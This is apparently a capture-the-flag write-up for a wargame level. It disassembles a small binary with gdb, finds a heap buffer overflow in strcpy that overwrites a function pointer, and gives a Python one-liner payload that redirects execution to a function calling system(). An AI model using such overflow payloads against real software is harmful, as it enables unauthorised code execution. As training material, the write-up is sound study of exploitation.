# Level 6


## Testing the program 

```bash
$ ./level6 
Segmentation fault (core dumped)

$ ./level6 test
Nope
```

We have an executable which segfaults if not given an argument, and if given one displays 'Nope'.
We can assume here is some type of check done. 


## Finding out more

```bash
(gdb) info functions
All defined functions:
[...]
0x08048454  n
0x08048468  m
0x0804847c  main
[...]
(gdb) 
```

We have three functions, let's see which one is called. 

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.
(gdb) 
```
Even though it is not explicit m is called. Let's see how :

```bash
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax) --> STORES 0x8048468 INTO *eax
```

0x8048468 is moved into a register (%edx) and then stored into memory at a pointer returned from malloc.

That address 0x8048468 is later indirectly called via call *%eax.

If we go back to our info functions we see that 0x08048468 correspond to the address of the m() function.


Let's look at the n() function :

```bash
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   %ebp
   0x08048455 <+1>:	mov    %esp,%ebp
   0x08048457 <+3>:	sub    $0x18,%esp
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave  
   0x08048467 <+19>:	ret    
End of assembler dump.
```
We see that n calls system(), so our goal is going to be to use the function m so that it calls n().


## Gettingn acces to the pass

In the main we see that there is a call to strcpy, let's find the offset to do a buffer overflow.

```bash
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
(gdb) 
```
0x41346341 --> Offset of 72
The offset is 72, so our final payload will be : Offset + n() address 
"B"*72  + "\x54\x84\x04\x08"


```bash
$ ./level6 $(python -c 'print "B"*72+"\x54\x84\x04\x08"')
***************************
```